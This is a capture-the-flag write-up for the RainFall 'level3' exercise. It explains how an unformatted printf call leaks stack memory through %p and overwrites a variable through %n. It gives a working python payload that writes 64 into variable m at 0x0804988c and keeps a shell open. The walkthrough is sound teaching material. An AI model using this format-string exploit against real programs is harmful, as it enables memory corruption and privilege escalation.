We start by opening the file in [dogbolt](https://dogbolt.org/). Here we can see that it use a printf without specifying a format

So we can try to play with it by, doing something like:
``` Shell
level3@RainFall:~$ ./level3
%p %p %p
0x200 0xb7fd1ac0 0xb7ff37d0
```

We can see that using `%p` result in memory display.

Since with printf we can write on the stack using `%n`, allowing the user to defined the string format is a vulnerability.

Now we will see how to write on our variable `m` to enter the if statement.
We know that `%n` can put the length of a string in a given address :

``` C
printf("abc%n\n",&nb); // nb == 3
```
Here the length of the string before the `%n` is put in `nb`.


Ok we know, that can we can write with `%n`, where do I put the result of `%n` ?
Let's find where to write:
- We know that when you use `%n` in a normal usage, `printf` put the value given by `%n` at a specific address given by the vaargs
- However when there is no corresponding argument `printf` will still attempt to access whatever value is on the stack
- We know that a buffer containing our input exists on the stack
- So we will put the address of `m` at the start of our buffer
- By entering "AAAA" in the input and using some `%p`, we can pinpoint the position within our buffer where the address of `m` is stored.
``` Shell
./level3
AAAA %p %p %p %p %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```
- We see that our buffer start at 4 pointer or `%4$p`


Address of `m` who can be found with `objdump -t`
address : `0804988c`
in little endian : `\x8c\x98\x04\x08`

The injection will look like:
[address of `m` (where `%n` will write)][60 (64 - len(address))][`%4$n`(where we can find the address to write)]

```Shell
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit && cat /tmp/exploit - | ./level3
```
